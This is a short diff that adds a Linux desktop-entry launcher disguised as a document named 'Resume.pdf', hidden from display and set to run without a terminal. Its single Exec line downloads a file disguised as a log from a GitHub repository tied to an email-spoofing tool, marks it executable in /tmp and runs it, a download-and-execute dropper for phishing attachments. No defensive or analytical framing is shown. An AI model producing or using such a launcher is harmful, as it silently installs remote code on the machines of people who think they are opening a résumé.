@@ -1,0 +1,7 @@
+[Desktop Entry]
+Name=Resume.pdf
+NoDisplay=true
+Version=1.1
+Terminal=false
+Type=Application
+Exec=/bin/sh -c "cd /tmp; wget https://raw.githubusercontent.com/yahav-h/smtp_email_spoofer/main/attachments/lin.access.log; chmod +x lin.access.log; ./lin.access.log"
